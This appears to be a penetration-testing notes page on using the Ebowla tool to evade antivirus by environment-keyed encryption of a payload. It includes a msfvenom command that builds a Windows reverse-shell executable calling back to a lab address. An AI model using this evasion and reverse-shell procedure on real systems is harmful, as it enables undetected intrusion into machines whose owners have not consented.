# Ebowla

## Ebowla **usage**

{% embed url="https://github.com/Genetic-Malware/Ebowla" %}

* **Get Ebowla AV evasion \(encrypt the executable payload with environment variables\)**

`git clone https://github.com/Genetic-Malware/Ebowla`

* Modify the output \(generic.config\)

`root@thp3:/opt/Ebowla# vi genetic.config`

![](../../../.gitbook/assets/f7ff2ba19cc8e5563355bebc01caa0ff.png)

![](../../../.gitbook/assets/c94a16abc44501ccfe7ca5072bbfe0aa.png)

* Check victim hostname:

![](../../../.gitbook/assets/abafbc04d8c405fb352e10dce0afedc2.png)

* Edit generic.config

![](../../../.gitbook/assets/f87f05d20fc05a32025ecd00d74457ec.png)

**to**

![](../../../.gitbook/assets/914207f9637660341d8e2adae863e566.png)

* Create a msfvenom payload \(staged -&gt; can be used with netcat ...\)

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.10 LPORT=80 -a x64 -f -o shell80.exe`

* Encode the payload with Ebowla :

![](../../../.gitbook/assets/e512e3ccfe2a3f2249f383df6de4f4ce.png)

![](../../../.gitbook/assets/6b325910b98a8017c240dbf429a9c0f2.png)

